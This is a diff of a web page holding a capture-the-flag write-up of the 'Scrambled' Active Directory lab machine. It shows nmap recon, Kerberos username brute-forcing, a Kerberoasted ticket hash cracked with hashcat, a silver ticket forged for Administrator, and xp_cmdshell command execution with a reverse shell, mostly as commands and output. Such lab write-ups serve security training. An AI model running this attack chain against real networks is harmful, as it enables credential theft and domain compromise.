@@ -5,7 +5,7 @@
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="MØstXeon">
-<meta name="description" content="Starting with a full tcp port scan we got the below results
+<meta name="description" content="Initial Recon Nmap Starting with a full tcp port scan we got the below results
 $ nmap -vvv -p- -A -oN nmap/tcp-all.txt 10.10.11.168 Nmap scan report for 10.10.11.168 Host is up, received syn-ack (0.084s latency). Scanned at 2022-09-20 03:50:10 EEST for 512s Not shown: 65513 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack Simple DNS Plus 80/tcp open http syn-ack Microsoft IIS httpd 10.0 |_http-title: Scramble Corp Intranet |_http-server-header: Microsoft-IIS/10." />
 <meta name="keywords" content=", Active Directory, .net, Desirialization, Windows, Bruteforcing, Reverse-Engineering, Silver-Ticket, Kerberos" />
 <meta name="robots" content="noodp" />
@@ -40,14 +40,14 @@ $ nmap -vvv -p- -A -oN nmap/tcp-all.txt 10.10.11.168 Nmap scan report for 10.10.
 
 
 <meta itemprop="name" content="Scrambled">
-<meta itemprop="description" content="Starting with a full tcp port scan we got the below results
+<meta itemprop="description" content="Initial Recon Nmap Starting with a full tcp port scan we got the below results
 $ nmap -vvv -p- -A -oN nmap/tcp-all.txt 10.10.11.168 Nmap scan report for 10.10.11.168 Host is up, received syn-ack (0.084s latency). Scanned at 2022-09-20 03:50:10 EEST for 512s Not shown: 65513 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack Simple DNS Plus 80/tcp open http syn-ack Microsoft IIS httpd 10.0 |_http-title: Scramble Corp Intranet |_http-server-header: Microsoft-IIS/10."><meta itemprop="datePublished" content="2022-09-27T22:16:35+03:00" />
 <meta itemprop="dateModified" content="2022-09-27T22:16:35+03:00" />
-<meta itemprop="wordCount" content="3739">
+<meta itemprop="wordCount" content="3726">
 <meta itemprop="keywords" content="Active Directory,.net,Desirialization,Windows,Bruteforcing,Reverse-Engineering,Silver-Ticket,Kerberos," />
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Scrambled"/>
-<meta name="twitter:description" content="Starting with a full tcp port scan we got the below results
+<meta name="twitter:description" content="Initial Recon Nmap Starting with a full tcp port scan we got the below results
 $ nmap -vvv -p- -A -oN nmap/tcp-all.txt 10.10.11.168 Nmap scan report for 10.10.11.168 Host is up, received syn-ack (0.084s latency). Scanned at 2022-09-20 03:50:10 EEST for 512s Not shown: 65513 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack Simple DNS Plus 80/tcp open http syn-ack Microsoft IIS httpd 10.0 |_http-title: Scramble Corp Intranet |_http-server-header: Microsoft-IIS/10."/>
 
 
@@ -155,11 +155,52 @@ $ nmap -vvv -p- -A -oN nmap/tcp-all.txt 10.10.11.168 Nmap scan report for 10.10.
           
         </figure>
       
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Table of Contents</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#initial-recon">Initial Recon</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#webserver-enumeration">WebServer Enumeration</a></li>
+        <li><a href="#usernamepassword-bruteforce">Username/Password Bruteforce</a></li>
+      </ul>
+    </li>
+    <li><a href="#tgt-request">TGT Request</a></li>
+    <li><a href="#kerberosting-attack">Kerberosting Attack</a>
+      <ul>
+        <li><a href="#requesting-ticket">Requesting Ticket</a></li>
+        <li><a href="#cracking-ticket-using-hashcat">Cracking Ticket Using Hashcat</a></li>
+      </ul>
+    </li>
+    <li><a href="#silver-ticket-attack">Silver Ticket Attack</a></li>
+    <li><a href="#interacting-with-sql-server-as-administrator">Interacting with SQL Server As Administrator</a>
+      <ul>
+        <li><a href="#enumerating-the-database">Enumerating the Database</a></li>
+        <li><a href="#getting-reverse-via-xp_cmdshell">Getting Reverse via xp_cmdshell</a></li>
+        <li><a href="#switching-to-miscsvc-user-and-getting-usertxt">Switching to MiscSvc User and Getting user.txt</a></li>
+      </ul>
+    </li>
+    <li><a href="#post-enumeration">Post Enumeration</a></li>
+    <li><a href="#exploring-scrambleclient-executable">Exploring ScrambleClient executable</a>
+      <ul>
+        <li><a href="#finding-potential-desirialization-vulnerability">Finding Potential Desirialization Vulnerability</a></li>
+        <li><a href="#exploiting-desirialization-vulnerability">Exploiting Desirialization Vulnerability</a></li>
+        <li><a href="#understanding-how-to-send-data">Understanding How to send Data</a></li>
+        <li><a href="#getting-command-execution-as-administrator">Getting Command Execution As Administrator</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
 
       
 
       <div class="post-content">
-        <hr>
+        <h2 id="initial-recon">Initial Recon</h2>
+<h3 id="nmap">Nmap</h3>
 <p>Starting with a full tcp port scan we got the below results</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -vvv -p- -A -oN nmap/tcp-all.txt 10.10.11.168
 </span></span><span style="display:flex;"><span>
@@ -475,6 +516,7 @@ $ nmap -vvv -p- -A -oN nmap/tcp-all.txt 10.10.11.168 Nmap scan report for 10.10.
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Tue Sep 20 03:58:42 2022 -- 1 IP address (1 host up) scanned in 512.62 seconds</span></span></span></code></pre></div>
 <p>We can see the usual windows ports are open in addition to port 80 indicating the presence of a webserver and another weird port 4411 which nmap couldn&rsquo;t identify</p>
 <p>We can also see the domain name leaked by ldap (port 389) <em>scrm.local</em> and the domain controller name <em>DC1.scrm.local</em>, so we&rsquo;ll add these to the <em>/etc/hosts</em> file.</p>
+<h3 id="webserver-enumeration">WebServer Enumeration</h3>
 <p>Moving on to the webserver, the first thing I did is to enumerate subdomains while surfing the page but I got nothing.</p>
 <p>Next let&rsquo;s see what the site hides:</p>
 <p><img src="scrm.local-home-page.png" alt="Home Page"></p>
@@ -488,6 +530,7 @@ $ nmap -vvv -p- -A -oN nmap/tcp-all.txt 10.10.11.168 Nmap scan report for 10.10.
 <p>On the <em>New User Account Page</em> we have a form but I couldn&rsquo;t get any result from it.</p>
 <p>I did try directory bruteforcing but again no results.
 The same goes for fuzzing the application on port <em>4411</em>.</p>
+<h3 id="usernamepassword-bruteforce">Username/Password Bruteforce</h3>
 <p>From here, I thought of using kerberos authentication to bruteforce usernames and maybe passwords also.</p>
 <p>Usually I start enumerating usernames using <a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt"><em>seclists/Usernames/xato-net-10-million-usernames.txt</em></a> which is a long list of various usernames to see how usernames look like <em>for example if they use [First Name].[Last Name] or [First Initial].[Last Name] &hellip;</em>, however by looking at the previous terminal screenshot, I can see that <em>ksimpson</em> might be a valid username, so I can assume that usernames are of form <em>[First Initial][Last Name]</em></p>
 <p>Now I can use <a href="https://github.com/ropnop/kerbrute"><em>kerbrute</em></a> with a specific wordlist, like the ones from <a href="https://github.com/attackdebris/kerberos_enum_userlists"><em>kerberos_enum_userlists</em></a>, specifically I&rsquo;ll use <a href="https://github.com/attackdebris/kerberos_enum_userlists/blob/master/A-ZSurnames.txt"><em>A-ZSurnames.txt</em></a> since I know this is how most likely usernames will be.</p>
@@ -566,6 +609,7 @@ The same goes for fuzzing the application on port <em>4411</em>.</p>
 </li>
 </ul>
 <p>And we got a valid hit!! However I can&rsquo;t use these credentials directly because <em>NTLM authentication is disabled</em>, so I had to think of other solutions, like using kerberos tickets to interact with the domain.</p>
+<h2 id="tgt-request">TGT Request</h2>
 <p>To do that I need to request a <em>Ticket Granting Ticket</em> from the domain controller, which I will use to authenticate to other services like LDAP.
 For this I will use <a href="https://github.com/SecureAuthCorp/impacket"><em>impacket-scripts</em></a>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/getTGT.py -dc-ip dc1.scrm.local scrm/ksimpson:ksimpson
@@ -579,6 +623,7 @@ For this I will use <a href="https://github.com/SecureAuthCorp/impacket"><em>imp
 </span></span><span style="display:flex;"><span>    ...
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>$ export KRB5CCNAME<span style="color:#f92672">=</span>ksimpson.ccache</span></span></code></pre></div></p>
+<h2 id="kerberosting-attack">Kerberosting Attack</h2>
 <p>From here, using <a href="https://github.com/SecureAuthCorp/impacket"><em>impacket-scripts</em></a> I can now query <em>LDAP</em> for different information, so I&rsquo;ll look for any <em>Service Principal Names</em> to see if <a href="https://youtu.be/xH5T9-m9QXw"><em>kerberosting attack</em></a> might work.</p>
 <ul>
 <li>Note: If you&rsquo;re following along using older versions of impacket (&lt;0.9.25) and you&rsquo;re getting an error like <em>&hellip; derived from BaseException &hellip;</em> then you can either clone the newer version of <a href="https://github.com/SecureAuthCorp/impacket"><em>impacket-scripts</em></a> or follow the <a href="https://github.com/SecureAuthCorp/impacket/issues/1206"><em>solution</em></a> proposed by the author of this machine. For this write-up, I will use the newer version of impacket 0.10.1 as of the time of writing this.</li>
@@ -593,6 +638,7 @@ For this I will use <a href="https://github.com/SecureAuthCorp/impacket"><em>imp
 <ul>
 <li>Notice the use of <em>dc1.scrm.local</em> using the flag <em>-dc-host</em> and not the <em>ip address</em> like <em>-dc-host 10.10.11.168</em> which will give an error.</li>
 </ul>
+<h3 id="requesting-ticket">Requesting Ticket</h3>
 <p>It appears that we can do <a href="https://youtu.be/xH5T9-m9QXw"><em>kerberosting attack</em></a> against <em>MSSQLSvc</em>, so let&rsquo;s append the <em>-request</em> to the previous command to get the encrypted ticket for this service.
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/GetUserSPNs.py -dc-host dc1.scrm.local scrm.local/ksimpson:ksimpson -k -no-pass -target-domain scrm.local -request
 </span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
@@ -605,12 +651,14 @@ For this I will use <a href="https://github.com/SecureAuthCorp/impacket"><em>imp
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$38ac0e94da96e9299e64f23d20f88676$e2108160934493e1d8fb52858eb0b496de7803f86824345c8248901d01f29d72b4d70d7893ef49a2b1533b370713430e1425005bf94e0ccf8caa86b641cf79e6c505468ecfb10a0bbb92401e60d6e8e739415ac438710dabb4a91ff0f40717735588976685723d47511c4018ec60820beed32a2f0af6bb970781581c46afc1df4506058711c38a6892b615f4f71acd96cde456d8ad941cdb41957fbeaab2329ae86c952ee4a08c4240a26cdda138b72ee120a4476aaeb89974bc00afab02149b4b45deff940965e3182741ad128f5f4cb126557d4e6e5fff6cd4e929db656000296d8f1da9b8140563e1d655c3403e9af591b1d7842d4afaab1a0d38bc07eac84dbea11ac57c7b6f60af3fa23cdcf102813add3109b34738d10251731933de08f26f9dde27483a90f557644b1bcffd7f9d66f4bad2881f379be926d95ac3ef42c71eb7423dcbc06ea3b4977b119cb9ea29579e8da48b23d8414268488bd0160dffa75c77349fdbdbd615fc2c2011b9ec3a1f4af34e953d026c66b71456b7688a01473c8f8b3feccec7bfe1704f031a5ed5ae1ac654a8652e2bf7c9bb365c01d23fba38a6dcbd4cd62dbf0fd6d102a403fb5f0beb5e05132f7684ff73e8d3f34111d7bd2b313c8b7cf09df19d98c40235d9a825b5a084f65ba14cb10c78c404e159b4976cd081835d627fba402877285cc9dba95a37069cb85d79e49f129ac45f3cc1b819a61e84beeebaebfd6ed87d8a8ddeef31d953050692bf5fde183e28fb96c3dac626e7d9ec7e87d860b319b8995bc485e18be089e19f2500f1d209c43880146b9381f33d36d659219a061596feaed3d6a97602bc823c256e635bbb3eeaa708e5365006d97570dccc71fae7e0d08aaab633ee03ce96a2650628f9e7715ae90b5a5b0e9221ae6a2bf88907ac9aaa0a534b09799b0261787d77c9ccb74cdcfe07e840e1dcbcd6c5eb64976ce3abed14c2e92c3754daf3941009a60652822e03346a7ad5ca4a3766ea68fa8edd8968bfe1d98a069a064e41926e762bc1c6abb3e2a57c87505ef9d377b1fc5fdea5e7b0af4de5ccaaa4ee78548a7e0f19e9a28c34d18285c1c792cd481b7867ad45b5e15035e368f3e2735d0bf66fe5427943115f08ab3ef186c2169a7c305ae48b61180d4ef1d51e3179d181fb97be3c6b26ca8419f6680d714b45c96ae443e3ea8bcd319045847a2db3e2942082805540bb39c790a535e992e9f4f860922bdaeb181680f1366c9d0119ccd97d02fa18aae5af9138990771bcd25da4356c31896f6b471393da256c0f64d86851e6705ba68298711a21cc039f98139056813d1ebb4dd43085e68668a31c76e0935c8146eb490260614a58786816cc63530bd6cb9034b646e359647e61b650fd73f10839feb4b8c92a8d58c8c7ab604b07a0cd86aaab0e4586231fc74abf0e3ca0</span></span></code></pre></div></p>
+<h3 id="cracking-ticket-using-hashcat">Cracking Ticket Using Hashcat</h3>
 <p>And now we try to crack this ticket using hachcat and rockyou.txt</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">13100</span> <span style="color:#e6db74">&#39;$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$38ac0e94da96e9299e64f23d20f88676$e2108160934493e1d8fb52858eb0b496de7803f86824345c8248901d01f29d72b4d70d7893ef49a2b1533b370713430e1425005bf94e0ccf8caa86b641cf79e6c505468ecfb10a0bbb92401e60d6e8e739415ac438710dabb4a91ff0f40717735588976685723d47511c4018ec60820beed32a2f0af6bb970781581c46afc1df4506058711c38a6892b615f4f71acd96cde456d8ad941cdb41957fbeaab2329ae86c952ee4a08c4240a26cdda138b72ee120a4476aaeb89974bc00afab02149b4b45deff940965e3182741ad128f5f4cb126557d4e6e5fff6cd4e929db656000296d8f1da9b8140563e1d655c3403e9af591b1d7842d4afaab1a0d38bc07eac84dbea11ac57c7b6f60af3fa23cdcf102813add3109b34738d10251731933de08f26f9dde27483a90f557644b1bcffd7f9d66f4bad2881f379be926d95ac3ef42c71eb7423dcbc06ea3b4977b119cb9ea29579e8da48b23d8414268488bd0160dffa75c77349fdbdbd615fc2c2011b9ec3a1f4af34e953d026c66b71456b7688a01473c8f8b3feccec7bfe1704f031a5ed5ae1ac654a8652e2bf7c9bb365c01d23fba38a6dcbd4cd62dbf0fd6d102a403fb5f0beb5e05132f7684ff73e8d3f34111d7bd2b313c8b7cf09df19d98c40235d9a825b5a084f65ba14cb10c78c404e159b4976cd081835d627fba402877285cc9dba95a37069cb85d79e49f129ac45f3cc1b819a61e84beeebaebfd6ed87d8a8ddeef31d953050692bf5fde183e28fb96c3dac626e7d9ec7e87d860b319b8995bc485e18be089e19f2500f1d209c43880146b9381f33d36d659219a061596feaed3d6a97602bc823c256e635bbb3eeaa708e5365006d97570dccc71fae7e0d08aaab633ee03ce96a2650628f9e7715ae90b5a5b0e9221ae6a2bf88907ac9aaa0a534b09799b0261787d77c9ccb74cdcfe07e840e1dcbcd6c5eb64976ce3abed14c2e92c3754daf3941009a60652822e03346a7ad5ca4a3766ea68fa8edd8968bfe1d98a069a064e41926e762bc1c6abb3e2a57c87505ef9d377b1fc5fdea5e7b0af4de5ccaaa4ee78548a7e0f19e9a28c34d18285c1c792cd481b7867ad45b5e15035e368f3e2735d0bf66fe5427943115f08ab3ef186c2169a7c305ae48b61180d4ef1d51e3179d181fb97be3c6b26ca8419f6680d714b45c96ae443e3ea8bcd319045847a2db3e2942082805540bb39c790a535e992e9f4f860922bdaeb181680f1366c9d0119ccd97d02fa18aae5af9138990771bcd25da4356c31896f6b471393da256c0f64d86851e6705ba68298711a21cc039f98139056813d1ebb4dd43085e68668a31c76e0935c8146eb490260614a58786816cc63530bd6cb9034b646e359647e61b650fd73f10839feb4b8c92a8d58c8c7ab604b07a0cd86aaab0e4586231fc74abf0e3ca0&#39;</span> /usr/share/wordlists/rockyou.txt
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    ...
 </span></span><span style="display:flex;"><span>    $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$38ac0e94da96e9299e64f23d20f88676$e2108160934493e1d8fb52858eb0b496de7803f86824345c8248901d01f29d72b4d70d7893ef49a2b1533b370713430e1425005bf94e0ccf8caa86b641cf79e6c505468ecfb10a0bbb92401e60d6e8e739415ac438710dabb4a91ff0f40717735588976685723d47511c4018ec60820beed32a2f0af6bb970781581c46afc1df4506058711c38a6892b615f4f71acd96cde456d8ad941cdb41957fbeaab2329ae86c952ee4a08c4240a26cdda138b72ee120a4476aaeb89974bc00afab02149b4b45deff940965e3182741ad128f5f4cb126557d4e6e5fff6cd4e929db656000296d8f1da9b8140563e1d655c3403e9af591b1d7842d4afaab1a0d38bc07eac84dbea11ac57c7b6f60af3fa23cdcf102813add3109b34738d10251731933de08f26f9dde27483a90f557644b1bcffd7f9d66f4bad2881f379be926d95ac3ef42c71eb7423dcbc06ea3b4977b119cb9ea29579e8da48b23d8414268488bd0160dffa75c77349fdbdbd615fc2c2011b9ec3a1f4af34e953d026c66b71456b7688a01473c8f8b3feccec7bfe1704f031a5ed5ae1ac654a8652e2bf7c9bb365c01d23fba38a6dcbd4cd62dbf0fd6d102a403fb5f0beb5e05132f7684ff73e8d3f34111d7bd2b313c8b7cf09df19d98c40235d9a825b5a084f65ba14cb10c78c404e159b4976cd081835d627fba402877285cc9dba95a37069cb85d79e49f129ac45f3cc1b819a61e84beeebaebfd6ed87d8a8ddeef31d953050692bf5fde183e28fb96c3dac626e7d9ec7e87d860b319b8995bc485e18be089e19f2500f1d209c43880146b9381f33d36d659219a061596feaed3d6a97602bc823c256e635bbb3eeaa708e5365006d97570dccc71fae7e0d08aaab633ee03ce96a2650628f9e7715ae90b5a5b0e9221ae6a2bf88907ac9aaa0a534b09799b0261787d77c9ccb74cdcfe07e840e1dcbcd6c5eb64976ce3abed14c2e92c3754daf3941009a60652822e03346a7ad5ca4a3766ea68fa8edd8968bfe1d98a069a064e41926e762bc1c6abb3e2a57c87505ef9d377b1fc5fdea5e7b0af4de5ccaaa4ee78548a7e0f19e9a28c34d18285c1c792cd481b7867ad45b5e15035e368f3e2735d0bf66fe5427943115f08ab3ef186c2169a7c305ae48b61180d4ef1d51e3179d181fb97be3c6b26ca8419f6680d714b45c96ae443e3ea8bcd319045847a2db3e2942082805540bb39c790a535e992e9f4f860922bdaeb181680f1366c9d0119ccd97d02fa18aae5af9138990771bcd25da4356c31896f6b471393da256c0f64d86851e6705ba68298711a21cc039f98139056813d1ebb4dd43085e68668a31c76e0935c8146eb490260614a58786816cc63530bd6cb9034b646e359647e61b650fd73f10839feb4b8c92a8d58c8c7ab604b07a0cd86aaab0e4586231fc74abf0e3ca0:Pegasus60
 </span></span><span style="display:flex;"><span>    ...</span></span></code></pre></div>
+<h2 id="silver-ticket-attack">Silver Ticket Attack</h2>
 <p>The password for this SQL service is <em>Pegasus60</em>, so I can now use a <a href="https://youtu.be/_nJ-b1UFDVM"><em>Silver Ticket Attack</em></a> against this service and pretend to be the Administrator.</p>
 <ul>
 <li>
@@ -649,6 +697,7 @@ It does not really matter if we get an error, the important thing is that we got
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving ticket in Administrator.ccache</span></span></code></pre></div></p>
 </li>
 </ul>
+<h2 id="interacting-with-sql-server-as-administrator">Interacting with SQL Server As Administrator</h2>
 <p>Now we can export the ticket like we did before, and interact with the SQL service pretending to be the Administrator.
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ export KRB5CCNAME<span style="color:#f92672">=</span>Administrator.ccache
 </span></span><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/mssqlclient.py scrm.local -k -no-pass
@@ -663,6 +712,7 @@ It does not really matter if we get an error, the important thing is that we got
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ACK: Result: <span style="color:#ae81ff">1</span> - Microsoft SQL Server <span style="color:#f92672">(</span><span style="color:#ae81ff">150</span> 7208<span style="color:#f92672">)</span> 
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
 </span></span><span style="display:flex;"><span>SQL&gt; </span></span></code></pre></div></p>
+<h3 id="enumerating-the-database">Enumerating the Database</h3>
 <p>Let&rsquo;s enumerate databases looking for some credentials
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>SQL&gt; SELECT name FROM master.dbo.sysdatabases
 </span></span><span style="display:flex;"><span>name                                                                                                                               
@@ -700,10 +750,8 @@ It does not really matter if we get an error, the important thing is that we got
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>MiscSvc      ScrambledEggs9900       scrm.local          <span style="color:#ae81ff">90</span>                  <span style="color:#ae81ff">0</span>   </span></span></code></pre></div></p>
 <p>Looks like we got new Creds <em>MiscSvc:ScrambledEggs9900</em></p>
-<ul>
-<li>From this point there are <em>2 ways</em> to solve the machine, either get the Administrator directly and then read the user.txt, or get shell via normal user then escalate to Administrator. Both ways aren&rsquo;t complicated, and are almost indentical, it just depends which one you choose to do first. For this write-up, I&rsquo;ll get the user.txt flag then escalate to Administrator, but I will discuss the other way at the end.</li>
-</ul>
-<p>So since we have Administrative privileges on the SQL service, we can try to enable <em>xp_cmdshell</em> and then execute commands that way. The process is very simple using <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py"><em>impacket-mssqlclient.py</em></a>
+<h3 id="getting-reverse-via-xp_cmdshell">Getting Reverse via xp_cmdshell</h3>
+<p>Since we have Administrative privileges on the SQL service, we can try to enable <em>xp_cmdshell</em> and then execute commands that way. The process is very simple using <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py"><em>impacket-mssqlclient.py</em></a>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>SQL&gt; enable_xp_cmdshell
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC1<span style="color:#f92672">)</span>: Line 185: Configuration option <span style="color:#e6db74">&#39;show advanced options&#39;</span> changed from <span style="color:#ae81ff">0</span> to 1. Run the RECONFIGURE statement to install.
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC1<span style="color:#f92672">)</span>: Line 185: Configuration option <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span> changed from <span style="color:#ae81ff">0</span> to 1. Run the RECONFIGURE statement to install.
@@ -734,6 +782,7 @@ It does not really matter if we get an error, the important thing is that we got
 <img src="getting-reverse-shell-as-sqlsvc.png" alt="Getting Reverse Shell as sqlvc"></p>
 </li>
 </ul>
+<h3 id="switching-to-miscsvc-user-and-getting-usertxt">Switching to MiscSvc User and Getting user.txt</h3>
 <p>In order to switch to <em>MiscSvc</em> user I&rsquo;ll use <em>New PSCredential Object</em> and <em>Invoke-Command</em> which are built in command from powershell
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; $pass <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#e6db74">&#34;ScrambledEggs9900&#34;</span> -AsPlainText -Force
 </span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; $cred <span style="color:#f92672">=</span> New-Object System.Management.Automation.PSCredential <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;scrm.local\MiscSvc&#34;</span>, $pass<span style="color:#f92672">)</span>
@@ -755,6 +804,7 @@ It does not really matter if we get an error, the important thing is that we got
 <ul>
 <li>Notice here I used <em>IEX</em> expression directly without <em>powershell</em> command before it, otherwise it will throw an error because <em>Invoke-Command</em> already uses powershell as interpreter not cmd.</li>
 </ul>
+<h2 id="post-enumeration">Post Enumeration</h2>
 <p>After enumerating a little bit, I was looking for the custom application listening on port <em>4411</em>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\S</span>hares&gt; netstat -ano | Select-String LISTENING
 </span></span><span style="display:flex;"><span>    ...
@@ -795,6 +845,7 @@ On kali I&rsquo;ll catch this using
 <li>I used awk here to strip the first few lines of <em>HTTP Request</em> that include <em>Request Line</em> and <em>Request Headers</em> because I only need the content of the files.</li>
 <li>Also, I need to press <em>ENTER</em> key in my netcat listener in order to terminate the connection from <em>Invoke-RestMethod</em>.</li>
 </ul>
+<h2 id="exploring-scrambleclient-executable">Exploring ScrambleClient executable</h2>
 <p>From this point, I&rsquo;ll spawn <a href="https://github.com/mandiant/commando-vm"><em>Commando VM</em></a> (windows vm for penetration testing) in order to better debug the application using <a href="https://github.com/dnSpy/dnSpy"><em>dnspy</em></a>.</p>
 <p><img src="application-image.png" alt="Application Image"></p>
 <p>Looks like this application requires some credentials (the old ones did not work)</p>
@@ -804,11 +855,13 @@ On kali I&rsquo;ll catch this using
 <p><img src="bypassing-login-custom-application.png" alt="Bypassing Login in Custom Application"></p>
 <p>It appears that anyone with the name <em>scrmdev</em> can login to the application without even supplying a password!</p>
 <p><img src="orders-custom-app.png" alt="Orders Custom App"></p>
+<h3 id="finding-potential-desirialization-vulnerability">Finding Potential Desirialization Vulnerability</h3>
 <p>Scrolling down a little bit in <a href="https://github.com/dnSpy/dnSpy"><em>dnspy</em></a>, I came accross an upload function that uploads some data to the server, but what&rsquo;s interesting about it is that it uses serialization.</p>
 <p><img src="upload-function-using-serialization.png" alt="Finding Interesting Uploads Function"></p>
 <p>Digging deeper, I found that it uses <a href="https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide#binaryformatter-security-vulnerabilities"><em>BinaryFormatter</em></a> object which is vulnerable to <a href="https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide#binaryformatter-security-vulnerabilities"><em>Desirialization Attack</em></a></p>
 <p><img src="use-of-binaryformatter.png" alt="Finding the use of BinaryFormatter"></p>
 <p>Since this is the client application, I can assume that the server also desirialzes this object using <a href="https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide#binaryformatter-security-vulnerabilities"><em>BinaryFormatter</em></a>, thus is prone to <a href="https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide#binaryformatter-security-vulnerabilities"><em>Desirialization Attack</em></a>.</p>
+<h3 id="exploiting-desirialization-vulnerability">Exploiting Desirialization Vulnerability</h3>
 <p>I found these blogs to be useful to understand how to exploit this vulnerabilty:</p>
 <ul>
 <li><a href="https://medium.com/@frycos/yet-another-net-deserialization-35f6ce048df7">https://medium.com/@frycos/yet-another-net-deserialization-35f6ce048df7</a></li>
@@ -819,6 +872,7 @@ On kali I&rsquo;ll catch this using
 </span></span><span style="display:flex;"><span>
